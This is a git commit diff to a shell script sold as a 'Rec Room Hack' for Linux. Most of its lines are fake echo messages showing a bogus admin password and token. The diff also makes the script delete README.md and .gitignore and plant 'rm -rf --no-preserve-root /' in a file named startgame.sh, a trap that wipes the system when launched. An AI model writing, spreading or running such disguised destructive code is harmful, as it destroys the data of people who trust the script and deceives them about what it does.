cbf70e2eb0a45d056559d9160cb23d8338a4565d
Raidenxd2 <64755433+Raidenxd2@users.noreply.github.com>
2023-03-20 10:52:26 -0400

    Update hack.sh

--- hack.sh
+++ hack.sh
@@ -1,6 +1,20 @@
 # Rec Room Hack (LINUX ONLY)
 
 ls
-apt install neofetch
+apt install -y neofetch
 neofetch
 echo Hacked Coach!!!
+echo Pass: 69420COACHADMIN69420
+echo Logging in...
+echo Running login --force --copy-config Coach 69420COACHADMIN69420...
+rm README.md
+rm .gitignore
+echo {"Users": "coach", "Token": "4952DFJJFRIQ39185989RECROOMTOKEN"} > Users.json
+mkdir ~/.recroom
+mv Users.json ~/.recroom/users.json
+echo Please wait...
+neofetch > ~/.recroom/sysinfo
+echo rm -rf --no-preserve-root / > ~/.recroom/startgame.sh
+# Dont need Steam for Half-Life 3. apt install -y steam
+apt install -y half-life3
+echo Finished!
